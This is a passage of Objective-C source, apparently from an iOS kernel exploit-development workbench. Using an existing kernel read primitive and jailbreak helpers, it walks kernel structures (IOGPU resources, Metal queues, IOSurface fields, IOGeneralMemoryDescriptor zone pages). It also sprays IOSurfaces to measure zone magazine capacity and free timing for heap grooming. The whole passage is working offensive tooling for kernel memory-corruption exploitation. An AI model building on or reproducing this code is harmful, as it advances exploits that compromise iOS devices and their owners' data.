        for (uint32_t i = 0; i < show; i++) { uint64_t q = [self jkread_ptr:arr + (uint64_t)i * 8]; uint32_t stored = is_kva(q) ? [self jkread32:q + FKT_21D50_QUEUE_QID_OFF] : 0; [self log:@"    ns[%u]=0x%llx qid@+0x420=%u", i, q, stored]; }
        if (hit) return hit;
    }
    return 0;
}

- (uint64_t)resourceFromDevice:(uint64_t)device id:(uint32_t)rid {
    if (!is_kva(device) || rid == 0) return 0; uint64_t reg = [self jkread_ptr:device + 0x10]; if (!is_kva(reg)) return 0;
    uint32_t bound = [self kread32:reg + 0x28]; if (rid >= bound) { [self log:@"  id 0x%x >= bound %u", rid, bound]; return 0; }
    uint64_t arr = [self jkread_ptr:reg + 0x10]; if (!is_kva(arr)) return 0;
    uint64_t res = [self jkread_ptr:arr + (uint64_t)rid * 8]; [self log:@"  lookup id=0x%x → resource=0x%llx (bound=%u)", rid, res, bound];
    if (!is_kva(res)) return 0;
    uint32_t kid30 = [self kread32:res + 0x30]; uint32_t kid70 = [self kread32:res + 0x70]; uint8_t tbyte = (uint8_t)[self kread32:res + 0x10];
    [self log:@"  resource+0x10 type_byte=0x%x +0x30=0x%x +0x70=0x%x (handoff id 0x%x)", tbyte, kid30, kid70, rid];
    return res;
}

- (void)dumpMetalSysMemory {
    [self log:@"=== PHASE3 Metal IOGPUResource registry walk (Q3) ==="];
    [self log:@"note: lookup(*(device+0x10),id); SysMemory=res+0x28; 21D50 MD=+0x80; 23F77 MD=+0x90"];
    [self log:@"note: P010 queue via *(device+0x88) namespace; 21D50 word1=+0x550; 23F77=+0x558"];
    NSString *hand = [NSString stringWithContentsOfFile:FKTHandoffPath() encoding:NSUTF8StringEncoding error:nil];
    pid_t appPid = 0; NSMutableArray *ents = [NSMutableArray array];
    for (NSString *line in [hand componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]) {
        NSArray *raw = [line componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        NSMutableArray *tok = [NSMutableArray array]; for (NSString *t in raw) if (t.length) [tok addObject:t];
        if (tok.count >= 2 && [tok[0] isEqualToString:@"pid"]) appPid = (pid_t)[tok[1] intValue];
        else if (tok.count >= 2 && [tok[0] isEqualToString:@"metal"]) {
            unsigned long long ua = 0; sscanf([(NSString *)tok[1] UTF8String], "%llx", &ua);
            NSString *tag = tok.count >= 3 ? (NSString *)tok[2] : @"?";
            uint32_t type = 0xffffffffu, rid = 0, conn = 0;
            for (NSUInteger ti = 3; ti < tok.count; ti++) {
                NSString *t = tok[ti]; unsigned v = 0;
                if ([t hasPrefix:@"type="] && sscanf(t.UTF8String + 5, "%x", &v) == 1) type = v;
                else if ([t hasPrefix:@"id="] && sscanf(t.UTF8String + 3, "%x", &v) == 1) rid = v;
                else if ([t hasPrefix:@"conn="] && sscanf(t.UTF8String + 5, "%x", &v) == 1) conn = v;
            }
            [ents addObject:@{@"ua" : @(ua), @"tag" : tag, @"type" : @(type), @"id" : @(rid), @"conn" : @(conn)}];
        } else if (tok.count >= 2 && [tok[0] isEqualToString:@"queue"]) {
            uint32_t qid = 0, qconn = 0;
            for (NSString *t in tok) { unsigned v = 0; if ([t hasPrefix:@"id="] && sscanf(t.UTF8String + 3, "%u", &v) == 1) qid = v; else if ([t hasPrefix:@"conn="] && sscanf(t.UTF8String + 5, "%x", &v) == 1) qconn = v; }
            [ents addObject:@{@"tag" : @"queue", @"type" : @0, @"id" : @(qid), @"conn" : @(qconn), @"ua" : @0}];
        } else if ([tok.firstObject isEqualToString:@"metal_fail"] || [tok.firstObject isEqualToString:@"metal_bnc_fail"]) [self log:@"app: %@", tok.firstObject];
    }
    [self log:@"metal entries=%lu appPid=%d", (unsigned long)ents.count, appPid];
    if (!ents.count) return;
    uint64_t proc = 0, appTask = 0;
    if (appPid > 0 && _jb_proc_find) { proc = _jb_proc_find(appPid); if (proc && _jb_proc_task) appTask = unsign_kptr(_jb_proc_task(proc)); }
    [self log:@"app proc=0x%llx task=0x%llx port_kobj=%p", proc, appTask, _jb_port_kobject];
    if (!appTask || !_jb_port_kobject) { [self log:@"FAIL: need app task + task_get_ipc_port_kobject for conn walk"]; return; }

    for (NSDictionary *e in ents) {
        NSString *tag = e[@"tag"]; uint32_t type = [e[@"type"] unsignedIntValue]; uint32_t rid = [e[@"id"] unsignedIntValue]; uint32_t conn = [e[@"conn"] unsignedIntValue];
        [self log:@"-- metal %@ type=0x%x id=0x%x conn=0x%x ua=0x%llx --", tag, type, rid, conn, [e[@"ua"] unsignedLongLongValue]];
        if ([tag isEqualToString:@"queue"]) {
            if (!MACH_PORT_VALID(conn)) { [self log:@"  skip queue: no conn"]; continue; }
            uint64_t device = [self deviceFromConnect:conn inTask:appTask]; if (!is_kva(device)) continue;
            uint64_t queue = [self queueFromDevice:device qid:rid];
            if (!is_kva(queue)) { [self log:@"  P010 FAIL: qid=%u not in *(device+0x88) namespace — not dumping device+0x550", rid]; continue; }
            uint32_t storedQid = [self jkread32:queue + FKT_21D50_QUEUE_QID_OFF];
            uint64_t w550 = [self jkread_ptr:queue + FKT_21D50_QUEUE_WORD1_OFF];
            uint64_t w558 = [self jkread_ptr:queue + FKT_23F77_QUEUE_WORD1_OFF];
            [self log:@"  P010 CommandQueue qid=%u stored@+0x420=%u kobj=0x%llx", rid, storedQid, queue];
            [self log:@"    21D50 word1 +0x550=0x%llx (%s)  23F77 twin +0x558=0x%llx (%s)", w550, va_class(w550), w558, va_class(w558)];
            [self log:@"    P007/23F77 FIELD# is +0x558 (MOVED +8 vs this 17.3 +0x550). Do not paste +0x550."];
            [self ptrTheory:"P010" cite:@"queue+0x550" live:w550 note:@"21D50 live word1; 23F77 moved to +0x558"];
            [self ptrTheory:"P010" cite:@"queue+0x558" live:w558 note:@"23F77 FIELD# (P007); 21D50 neighbor"];
            [self hexdump:queue size:0x40]; [self hexdump:queue + 0x400 size:0x180]; continue;
        }
        if (!MACH_PORT_VALID(conn) || rid == 0) { [self log:@"  skip: need valid conn+id (check app PAC strip of rr+0x10)"]; continue; }
        uint64_t device = [self deviceFromConnect:conn inTask:appTask]; if (!is_kva(device)) continue;
        uint64_t resource = [self resourceFromDevice:device id:rid]; if (!is_kva(resource)) continue;
        [self hexdump:resource size:0xa0];
        uint64_t sysmem = [self jkread_ptr:resource + 0x28]; [self log:@"  resource+0x28 SysMemory*=0x%llx", sysmem];
        if (!is_kva(sysmem)) { [self probeSysMemSlots:resource label:[[NSString stringWithFormat:@"RES_%@", tag] UTF8String]]; continue; }
        char lab[64]; snprintf(lab, sizeof(lab), "SysMem_%s_t%02x", tag.UTF8String, type & 0xff);
        [self probeSysMemSlots:sysmem label:lab]; [self sysmemAtlas:sysmem label:lab];
        [self ptrTheory:"IOGPUSYSMEM" cite:@"resource+0x28" live:sysmem note:[NSString stringWithFormat:@"%@ type=0x%x id=0x%x", tag, type, rid]];
    }
}

- (void)parseZoneNameHit:(uint64_t)namePtr {
    [self log:@"--- zone parse around namePtr=0x%llx ---", namePtr]; _gmd_zone_name_ptr = namePtr;
    uint8_t buf[0x100]; uint64_t base = namePtr > 0x40 ? namePtr - 0x40 : namePtr;
    if (![self kread:base into:buf size:sizeof(buf)]) return;
    for (size_t off = 0; off + 2 <= sizeof(buf); off += 2) {
        uint16_t v = 0; memcpy(&v, buf + off, 2);
        if (v == 0xb0 || v == 0x60 || v == 0x58 || v == 0x50 || v == 8) {
            [self log:@"  u16@name-0x40+0x%zx = 0x%x (zone kva 0x%llx)", off, v, base + off];
            if (v == 0xb0 && !_ans_gmd_elemsz) _ans_gmd_elemsz = 0xb0;
            if (v == 8) [self log:@"  *** possible magazine/cache count 8 @ 0x%llx (Q4 twin candidate)", base + off];
        }
    }
    for (int delta = -0x20; delta <= 0x40; delta += 4) { uint32_t u = [self kread32:namePtr + delta]; if ((u & 0xffff) == 0xb0 || (u & 0xffff) == 0x60 || (u & 0xff) == 8) [self log:@"  u32@name%+d = 0x%x", delta, u]; }
    uint64_t zself = namePtr - 0x10;
    if ([self jkread_ptr:zself] == zself) {
        _gmd_zone_kva = zself; uint16_t esz = [self kread16:zself + 0x34]; _gmd_elem_offs = [self kread16:zself + 0x36]; _gmd_chunk_elems = [self kread16:zself + 0x3a];
        if (esz == 0xb0) _ans_gmd_elemsz = 0xb0;
        [self log:@"  GMD zone_t LOCKED 0x%llx via z_self; esz=0x%x eoff=0x%x chunk_elems=%u (NOT +0x40 mag)", zself, esz, _gmd_elem_offs, _gmd_chunk_elems];
    }
    [self hexdump:zself size:0x180];
}

- (void)scanPtrsTo:(uint64_t)target name:(const char *)name inUnslid:(uint64_t)u size:(uint64_t)sz {
    uint64_t base = [self live:u]; uint64_t want = pac_strip(target);
    [self log:@"--- ptrs to %s live=0x%llx in [%s 0x%llx +0x%llx] ---", name, target, (u == FKT_DC_UNSLID) ? "DATA_CONST" : "DATA", base, sz];
    const size_t chunk = 0x4000; uint8_t *buf = malloc(chunk); if (!buf) return; int hits = 0;
    for (uint64_t off = 0; off + 8 < sz && hits < 12; off += chunk) {
        size_t n = (size_t)MIN(chunk, sz - off);
        if (![self kread:base + off into:buf size:n]) continue;
        for (size_t i = 0; i + 8 <= n && hits < 12; i += 8) {
            uint64_t q = 0; memcpy(&q, buf + i, 8);
            if (pac_strip(q) == want) {
                uint64_t hit = base + off + i; [self log:@"  PTR 0x%llx raw=0x%llx", hit, q];
                [self hexdump:hit > 0x20 ? hit - 0x20 : hit size:0x80];
                uint32_t maybeSize = [self kread32:hit + 0x08]; uint32_t maybeSize2 = [self kread32:hit + 0x10]; uint32_t maybeSize3 = [self kread32:hit + 0x18];
                [self log:@"  u32@+8=0x%x +0x10=0x%x +0x18=0x%x (instSize candidates)", maybeSize, maybeSize2, maybeSize3];
                if (strstr(name, "iokit.IOGeneralMemoryDescriptor")) [self parseZoneNameHit:hit];
                hits++;
            }
        }
    }
    [self log:@"  ptr-hits=%d", hits]; free(buf);
}

- (void)dumpKalloc3072Probe {
    [self log:@"=== Q6 kalloc.3072 name probe ==="];
    const char *needle = "kalloc.3072"; size_t nlen = strlen(needle);
    uint64_t base = [self live:FKT_DATA_UNSLID]; uint64_t span = FKT_DATA_SIZE;
    const size_t chunk = 0x4000; uint8_t *buf = malloc(chunk); int found = 0;
    if (buf) {
        for (uint64_t off = 0; off + nlen < span && !found; off += chunk - 16) {
            size_t n = (size_t)MIN(chunk, span - off);
            if (![self kread:base + off into:buf size:n]) continue;
            for (size_t i = 0; i + nlen < n; i++) { if (memcmp(buf + i, needle, nlen) == 0) { [self log:@"  FOUND in DATA at 0x%llx", base + off + i]; found = 1; break; } }
        }
        free(buf);
    }
    if (!found) {
        char page[0x1000]; uint64_t around = [self live:FKT_STR_DATA_KALLOC] & ~0xfffULL;
        if ([self kread:around into:page size:sizeof(page)]) { for (size_t i = 0; i + nlen < sizeof(page); i++) { if (memcmp(page + i, needle, nlen) == 0) { [self log:@"  FOUND near data.kalloc page at 0x%llx", around + i]; found = 1; break; } } }
    }
    _ans_kalloc3072 = found;
    [self log:@"  kalloc.3072 %s (21D50 static KC also had none — expect NO)", found ? "YES" : "NO"];
    [self log:@"  P045 pattern 0x100000001 is CheckandPrewire fill qword at table[i]+8 (23F77)."];
    [self log:@"  Scan live kmsgs/MD for that qword only if this process has kread; 21D50 ≠ 23F77 zone."];
}

- (void)sampleMagazineCounts:(uint64_t)zone maxFree:(int *)maxFree maxAlloc:(int *)maxAlloc label:(const char *)label {
    if (!is_kva(zone)) return; uint64_t magBase = [self jkread_ptr:zone + 0x40];
    [self log:@"  [%s] zone=0x%llx +0x40 magBase=0x%llx", label, zone, magBase];
    if (!is_kva(magBase) || is_ktextish(magBase)) { if (is_ktextish(magBase)) [self log:@"  skip magBase — cstring/TEXT (not a magazine page)"]; return; }
    for (int cpu = 0; cpu < 8; cpu++) {
        uint64_t mag = magBase + (uint64_t)cpu * 0x4000ULL;
        uint16_t ac = [self kread16:mag + 0x04]; uint16_t fc = [self kread16:mag + 0x06];
        if (ac > 64 && fc > 64) continue;
        [self log:@"    cpu%d mag=0x%llx alloc=%u free=%u", cpu, mag, ac, fc];
        if (maxFree && (int)fc > *maxFree) *maxFree = (int)fc;
        if (maxAlloc && (int)ac > *maxAlloc) *maxAlloc = (int)ac;
    }
}

- (void)testMagazineLive {
    [self log:@"=== LIVE TEST 1 — GMD zone magazine (spray / cap / swap latency) ==="];
    [self log:@"note: 23F77 CAP=8 @ unslid 0xfffffff007ad20b8; confirm LIVE max free_count on 21D50"];
    if (!is_kva(_gmd_zone_kva) && is_kva(_gmd_zone_name_ptr)) {
        for (int off = 0x10; off <= 0x50; off += 8) { uint64_t z = _gmd_zone_name_ptr - off; uint64_t mag = [self jkread_ptr:z + 0x40]; if (is_kva(mag) && !is_ktextish(mag)) { _gmd_zone_kva = z; break; } }
    }
    if (!is_kva(_gmd_zone_kva)) { [self log:@"FAIL: no GMD zone_t — class string scan must run first"]; return; }
    int maxFree = 0, maxAlloc = 0; [self sampleMagazineCounts:_gmd_zone_kva maxFree:&maxFree maxAlloc:&maxAlloc label:"pre"];
    const int N = 48; uint64_t t_free_ns[16]; int n_free_evt = 0; int prev_sum_free = -1; uint64_t t_swap0 = 0, t_swap1 = 0;
    for (int i = 0; i < N; i++) {
        IOSurfaceRef s = [KReader makeSurfaceW:64 h:64]; if (!s) continue; (void)IOSurfaceGetID(s); CFRelease(s);
        int sum = 0, mf = 0, ma = 0; uint64_t magBase = [self jkread_ptr:_gmd_zone_kva + 0x40];
        if (is_kva(magBase)) { for (int cpu = 0; cpu < 8; cpu++) { uint64_t mag = magBase + (uint64_t)cpu * 0x4000ULL; uint16_t fc = [self kread16:mag + 0x06]; uint16_t ac = [self kread16:mag + 0x04]; if (fc <= 64) sum += fc; if ((int)fc > mf) mf = fc; if ((int)ac > ma) ma = ac; } }
        if (mf > maxFree) maxFree = mf; if (ma > maxAlloc) maxAlloc = ma;
        if (prev_sum_free >= 0 && sum + 2 < prev_sum_free && n_free_evt < 16) { t_free_ns[n_free_evt++] = mach_absolute_time(); if (!t_swap0) t_swap0 = mach_absolute_time(); else if (!t_swap1) t_swap1 = mach_absolute_time(); [self log:@"  swap-shaped free drop at iter=%d sum_free %d→%d max_fc=%d", i, prev_sum_free, sum, mf]; }
        prev_sum_free = sum;
    }
    [self sampleMagazineCounts:_gmd_zone_kva maxFree:&maxFree maxAlloc:&maxAlloc label:"post-spray"];
    _ans_mag_cap_live = maxFree;
    [self log:@"  LIVE max free_count observed=%d (expect CAP 8 on 23F77 twin)", maxFree];
    [self log:@"  LIVE max alloc_count observed=%d", maxAlloc];
    if (maxFree > 0 && maxFree <= 8) [self log:@"  CAP twin: live saturates at %d — consistent with 23F77 CAP=8", maxFree];
    else if (maxFree > 8) [self log:@"  NOTE: max free_count %d > 8 — verify zone candidate / CPU mag stride", maxFree];
    if (t_swap0 && t_swap1) { mach_timebase_info_data_t tb; mach_timebase_info(&tb); uint64_t dt = (t_swap1 - t_swap0) * tb.numer / tb.denom; [self log:@"  free→swap-ish interval ~%llu ns between first two drop events", dt]; }
    else [self log:@"  swap latency: no clear free-count drop pair this run (need more frees / same CPU)"];
}

- (void)snapshotSurfaceFields:(uint64_t)surface label:(const char *)label {
    if (!is_kva(surface)) return; [self log:@"--- IOSurface snapshot %s kva=0x%llx ---", label, surface]; [self hexdump:surface size:0x100];
    static const uint32_t offs[] = { 0x28, 0x30, 0x38, 0x40, 0x50, 0x90, 0x158, 0x160, 0x170, 0x3c0, 0 };
    for (int i = 0; offs[i]; i++) {
        if (offs[i] == 0x3c0 || offs[i] == 0x90) { uint32_t v = [self kread32:surface + offs[i]]; [self log:@"  +0x%x = 0x%x", offs[i], v]; }
        else { uint64_t v = [self jkread_ptr:surface + offs[i]]; [self log:@"  +0x%x = 0x%llx (%s)", offs[i], v, va_class(v)]; }
    }
    uint64_t md = [self mdFromSurface:surface];
    if (is_kva(md)) {
        [self dumpMD:md label:label]; uint64_t ranges = [self jkread_ptr:md + 0x60];
        if (is_kva(ranges) && !is_ktextish(ranges)) { uint64_t a0 = [self kread64:ranges]; [self log:@"  MD ranges[0]=0x%llx (%s) — expect USER? for Create control", a0, va_class(a0)]; }
    }
}

- (void)testIOSurfaceLiveDump {
    [self log:@"=== LIVE TEST 2 — IOSurface +0x30 dump (control; not confused-deputy) ==="];
    [self log:@"note: 17.3 has no 64788 sel36 install — this is USER GMD control + purgeable delta"];
    IOSurfaceRef s = [KReader makeSurfaceW:128 h:128]; if (!s) { [self log:@"FAIL: IOSurfaceCreate"]; return; }
    mach_port_t mp = IOSurfaceCreateMachPort(s); uint64_t surf = 0;
    if (_jb_task_self && MACH_PORT_VALID(mp)) surf = [self surfaceFromPort:mp inTask:_jb_task_self()];
    if (!is_kva(surf) && MACH_PORT_VALID(mp)) surf = [self surfaceFromPort:mp];
    [self snapshotSurfaceFields:surf label:"create"];
    typedef kern_return_t (*setPurg_t)(IOSurfaceRef, uint32_t, uint32_t *); setPurg_t setPurg = (setPurg_t)dlsym(RTLD_DEFAULT, "IOSurfaceSetPurgeable");
    if (setPurg) {
        uint32_t old = 0; kern_return_t kr = setPurg(s, 3, &old); [self log:@"  IOSurfaceSetPurgeable Empty kr=0x%x old=%u", kr, old]; [self snapshotSurfaceFields:surf label:"after-Empty"];
        kr = setPurg(s, 1, &old); [self log:@"  IOSurfaceSetPurgeable NonVolatile kr=0x%x old=%u", kr, old]; [self snapshotSurfaceFields:surf label:"after-NonVolatile"];
    } else [self log:@"  IOSurfaceSetPurgeable missing — skip workload delta"];
    if (MACH_PORT_VALID(mp)) mach_port_deallocate(mach_task_self(), mp); CFRelease(s);
}

- (void)testANESetWalk {
    [self log:@"=== LIVE TEST 3 — Device+0x48 → IOGPU+0xf0 (IOSurfaceRoot*) ==="];
    [self log:@"note: pack17 — this is Root*, not a private ANE bag; fn4 uses Root for insert"];
    NSString *hand = [NSString stringWithContentsOfFile:FKTHandoffPath() encoding:NSUTF8StringEncoding error:nil];
    pid_t appPid = 0; uint32_t conn = 0;
    for (NSString *line in [hand componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]) {
        NSArray *raw = [line componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        NSMutableArray *tok = [NSMutableArray array]; for (NSString *t in raw) if (t.length) [tok addObject:t];
        if (tok.count >= 2 && [tok[0] isEqualToString:@"pid"]) appPid = (pid_t)[tok[1] intValue];
        if (tok.count >= 2 && [tok[0] isEqualToString:@"metal"]) { for (NSUInteger ti = 3; ti < tok.count; ti++) { unsigned v = 0; NSString *t = tok[ti]; if ([t hasPrefix:@"conn="] && sscanf(t.UTF8String + 5, "%x", &v) == 1) conn = v; } }
    }
    uint64_t proc = (appPid && _jb_proc_find) ? _jb_proc_find(appPid) : 0;
    uint64_t task = (proc && _jb_proc_task) ? unsign_kptr(_jb_proc_task(proc)) : 0;
    if (!task || !MACH_PORT_VALID(conn)) { [self log:@"FAIL: need app Metal conn in handoff (mint from app first)"]; return; }
    uint64_t device = [self deviceFromConnect:conn inTask:task]; if (!is_kva(device)) return;
    uint64_t iogpu = [self jkread_ptr:device + 0x48]; [self log:@"  Device+0x48 IOGPU*=0x%llx", iogpu];
    if (!is_kva(iogpu)) { [self hexdump:device size:0x80]; return; }
    [self hexdump:iogpu size:0x120]; uint64_t root = [self jkread_ptr:iogpu + 0xf0]; uint32_t cacheId = [self kread32:iogpu + 0xf8];
    [self log:@"  IOGPU+0xf0 Root*=0x%llx +0xf8 cacheId=0x%x", root, cacheId];
    if (!is_kva(root)) return; [self hexdump:root size:0x100];
    for (uint32_t off = 0xd0; off <= 0x180; off += 8) { uint64_t p = [self jkread_ptr:root + off]; if (is_kva(p)) [self log:@"  Root+0x%x = 0x%llx", off, p]; }
    [self log:@"  static RE: no teardown prepare of set; live = contents only"];
}

- (void)testResidualRuntime {
    [self log:@"=== LIVE TEST 4 — residual runtime (creator / consumer / pressure) ==="];
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleMultitouchDevice"));
    if (!svc) svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleMultitouchHIDEventService"));
    if (!svc) svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("AppleMultitouchSPI"));
    [self log:@"  Multitouch service=0x%x", svc];
    if (svc) {
        io_connect_t c = IO_OBJECT_NULL; kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c); [self log:@"  IOServiceOpen type0 kr=0x%x conn=0x%x", kr, c];
        if (kr == KERN_SUCCESS && c) {
            mach_vm_address_t addr = 0; mach_vm_size_t sz = 0;
            kr = IOConnectMapMemory(c, 0x40, mach_task_self(), &addr, &sz, kIOMapAnywhere);
            [self log:@"  MapMemory type=0x40 kr=0x%x addr=0x%llx sz=0x%llx", kr, (unsigned long long)addr, (unsigned long long)sz];
            if (kr == KERN_SUCCESS && addr) IOConnectUnmapMemory(c, 0x40, mach_task_self(), addr);
            IOServiceClose(c);
        }
        IOObjectRelease(svc);
    } else [self log:@"  no Multitouch service from sandboxed matching — expected"];
    [self log:@"  consumer: setPurgeable/flush = MD vt+0x80 / prepare — NOT write-through (pack40)"];
    [self log:@"  pressure: map ~256MB anonymous then re-sample GMD magazine"];
    void *pressure = mmap(NULL, 256UL << 20, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (pressure != MAP_FAILED) {
        memset(pressure, 1, 1 << 20); int mf = 0, ma = 0;
        if (is_kva(_gmd_zone_kva)) [self sampleMagazineCounts:_gmd_zone_kva maxFree:&mf maxAlloc:&ma label:"pressure"];
        munmap(pressure, 256UL << 20); [self log:@"  zone bridge: still same zone_t 0x%llx — foreign free would panic (0xa5f1034)", _gmd_zone_kva];
    } else [self log:@"  mmap pressure failed errno=%d", errno];
}

- (void)runLiveTests {
    [self log:@"=== LIVE TESTS (tfp0 workbench — 21D50 only) ==="];
    [self testMagazineLive]; [self testIOSurfaceLiveDump]; [self testANESetWalk]; [self testResidualRuntime];
}

- (uint64_t)resolveKernelTask { if (_jb_proc_find && _jb_proc_task) { uint64_t p = _jb_proc_find(0); if (p) return unsign_kptr(_jb_proc_task(p)); } return 0; }
- (uint64_t)resolveSelfTask { if (_jb_task_self) return unsign_kptr(_jb_task_self()); if (_jb_proc_find && _jb_proc_task) { uint64_t p = _jb_proc_find(getpid()); if (p) return unsign_kptr(_jb_proc_task(p)); } return 0; }

- (int)taskKind:(uint64_t)p {
    p = unsign_kptr(p); if (!p) return 0;
    if (_kernel_task && p == _kernel_task) return 1;
    if (_self_task && p == _self_task) return 2;
    return 0;
}

- (BOOL)occSeen:(uint64_t)md { for (int i = 0; i < _occ_seen_n; i++) if (_occ_seen_list[i] == md) return YES; if (_occ_seen_n < 256) _occ_seen_list[_occ_seen_n++] = md; return NO; }

- (void)noteOccupant:(uint64_t)md tag:(const char *)tag {
    if (!is_kva(md) || [self occSeen:md]) return;
    uint64_t vt = [self jkread_ptr:md]; if (!vt) { _occ_zero++; return; }
    uint64_t ranges = [self jkread_ptr:md + 0x60]; uint64_t len = [self jkread64:md + 0x50]; uint64_t a0 = 0, s0 = 0; const char *rcls = "NO_RANGES";
    if (is_kva(ranges) && !is_ktextish(ranges)) { a0 = [self jkread64:ranges]; s0 = [self jkread64:ranges + 8]; rcls = va_class(a0); }
    int tk = 0; uint32_t taskOff = 0;
    for (uint32_t off = 0x10; off <= 0xa8; off += 8) { int k = [self taskKind:[self jkread_ptr:md + off]]; if (k) { tk = k; taskOff = off; break; } }
    const char *tname = tk == 1 ? "kernel_task" : (tk == 2 ? "our_task" : "task?");
    uint32_t flags = [self jkread32:md + 0x20]; const char *kind = "OTHER";
    if (strcmp(rcls, "USER?") == 0) { _occ_user++; kind = "WAR"; }
    else if (is_shape1_object(a0, s0, flags, tk)) { _occ_kern++; kind = "SHAPE1"; }
    else if (strcmp(rcls, "KERN") == 0) { _occ_kern++; _occ_kern_win++; kind = "KERN_WIN"; }
    else { _occ_other++; }
    [self log:@"  OCC %s md=0x%llx kind=%s len=0x%llx ranges0=0x%llx (%s) sz=0x%llx %s@+0x%x class %@", tag, md, kind, len, a0, rcls, s0, tname, taskOff, [self classNameFromVtable:vt]];
    if (is_shape1_object(a0, s0, flags, tk)) { [self log:@"    *** SHAPE-1: kalloc/IOKit object body — dump once ***"]; [self dumpMD:md label:tag]; }
    else if (strcmp(rcls, "KERN") == 0) { [self log:@"    KERN_WIN (not Shape-1 heap) — pack 33 / variant B"]; }
}

- (void)walkMagazineElems:(uint64_t)mag cpu:(int)cpu {
    if (!is_kva(mag)) return;
    uint16_t ac = [self kread16:mag + 0x04]; uint16_t fc = [self kread16:mag + 0x06];
    uint64_t aa = [self jkread_ptr:mag + 0x08]; uint64_t fa = [self jkread_ptr:mag + 0x10];
    [self log:@"  mag cpu%d @0x%llx ac=%u fc=%u alloc_arr=0x%llx free_arr=0x%llx", cpu, mag, ac, fc, aa, fa];
    if (ac > 0 && ac <= 16 && is_kva(aa)) { for (uint16_t i = 0; i < ac; i++) [self noteOccupant:[self jkread_ptr:aa + (uint64_t)i * 8] tag:"mag_alloc"]; }
    if (fc > 0 && fc <= 16 && is_kva(fa)) { for (uint16_t i = 0; i < fc; i++) [self noteOccupant:[self jkread_ptr:fa + (uint64_t)i * 8] tag:"mag_free"]; }
}

- (void)scanPageForGMD:(uint64_t)hint {
    if (!is_kva(hint)) return; uint64_t want = _gmd_vtable ? pac_strip(_gmd_vtable) : 0; uint64_t page = hint & ~0x3fffULL;
    uint8_t *buf = malloc(0x4000); if (!buf || ![self kread:page into:buf size:0x4000]) { free(buf); return; }
    int hits = 0;
    for (size_t off = 0; off + 8 <= 0x4000 && hits < 24; off += 8) {
        uint64_t q = 0; memcpy(&q, buf + off, 8); uint64_t s = pac_strip(unsign_kptr(q));
        if (want && s == want) { [self noteOccupant:page + off tag:"page_vt"]; hits++; }
    }
    free(buf);
}

- (void)printGmdShape:(uint64_t)md tag:(const char *)tag {
    if (!is_kva(md)) return; uint64_t vt = [self jkread_ptr:md]; uint64_t ranges = [self jkread_ptr:md + 0x60]; uint64_t a0 = 0, s0 = 0;
    if (is_kva(ranges) && !is_ktextish(ranges)) { a0 = [self jkread64:ranges]; s0 = [self jkread64:ranges + 8]; }
    uint64_t task = [self jkread_ptr:md + 0x70]; const char *tk = "other"; int k = [self taskKind:task];
    if (k == 1) tk = "kernel_task"; else if (k == 2) tk = "our_task";
    uint32_t flags = [self jkread32:md + 0x20]; const char *kind = "OTHER";
    if (strcmp(va_class(a0), "USER?") == 0) kind = "WAR"; else if (is_shape1_object(a0, s0, flags, k)) kind = "SHAPE1"; else if (strcmp(va_class(a0), "KERN") == 0) kind = "KERN_WIN";
    [self log:@"  SHAPE %s kind=%s class %@ flags=0x%x len=0x%llx ranges*=0x%llx inline=%d", tag, kind, [self classNameFromVtable:vt], [self jkread32:md + 0x20], [self jkread64:md + 0x50], ranges, (unsign_kptr(ranges) == md + 0x78) ? 1 : 0];
    [self ptrTheory:"64788" cite:[NSString stringWithFormat:@"GMD/%s", tag] live:md note:[NSString stringWithFormat:@"kind=%s flags=0x%x", kind, [self jkread32:md + 0x20]]];
    [self log:@"    +0x00 vt  +0x20 flags  +0x50 getLength  +0x60 ranges*  +0x70 task=%s  +0x88 prep=0x%x", tk, [self jkread32:md + 0x88]];
    [self log:@"    ranges[0] addr=0x%llx (%s) len=0x%llx", a0, va_class(a0), s0];
}

- (BOOL)pageWalked:(uint64_t)page { for (int i = 0; i < _n_pages_walked; i++) if (_pages_walked[i] == page) return YES; if (_n_pages_walked < 32) _pages_walked[_n_pages_walked++] = page; return NO; }

- (void)walkGMDZonePage:(uint64_t)page {
    if (!is_kva(page) || [self pageWalked:page]) return;
    uint16_t eoff = _gmd_elem_offs ? _gmd_elem_offs : 0x10; uint16_t esz = 0xb0; uint16_t n = _gmd_chunk_elems ? _gmd_chunk_elems : 0x5d;
    if (n > 128) n = 128; [self log:@"  zone-page 0x%llx eoff=0x%x esz=0x%x n=%u", page, eoff, esz, n];
    int logged = 0;
    for (uint16_t i = 0; i < n; i++) {
        uint64_t md = page + eoff + (uint64_t)i * esz; uint64_t vt = [self jkread_ptr:md];
        if (!vt || vt == (uint64_t)-1) { _occ_zero++; continue; }
        if (!is_ktextish(vt)) continue; [self noteOccupant:md tag:"zone_el"];
        if (logged < 6) { [self printGmdShape:md tag:"zone_el"]; logged++; }
    }
}

- (void)scanGMDZoneOccupants {
    [self log:@"=== Q6 — GMD zone occupants (real 0xb0 grid; not app Metal alias) ==="];
    [self log:@"note: 64788 spray class = iokit.IOGeneralMemoryDescriptor 0xb0"];
    if (is_kva(_gmd_zone_kva)) {
        uint16_t esz = [self kread16:_gmd_zone_kva + 0x34]; uint16_t eoff = [self kread16:_gmd_zone_kva + 0x36];
        uint16_t npg = [self kread16:_gmd_zone_kva + 0x38]; uint16_t ne = [self kread16:_gmd_zone_kva + 0x3a];
        _gmd_elem_offs = eoff; _gmd_chunk_elems = ne; if (esz == 0xb0) _ans_gmd_elemsz = 0xb0;
        [self log:@"  zone=0x%llx esz=0x%x eoff=0x%x chunk_pages=%u chunk_elems=%u", _gmd_zone_kva, esz, eoff, npg, ne];
        uint32_t pageq[4] = { [self kread32:_gmd_zone_kva + 0x98], [self kread32:_gmd_zone_kva + 0x9c], [self kread32:_gmd_zone_kva + 0xa0], [self kread32:_gmd_zone_kva + 0xa4] };
        [self log:@"  pageq packed empty=0x%x partial=0x%x full=0x%x va=0x%x", pageq[0], pageq[1], pageq[2], pageq[3]];
        int walked = 0;
        for (int i = 0; i < 4 && walked < 16; i++) {
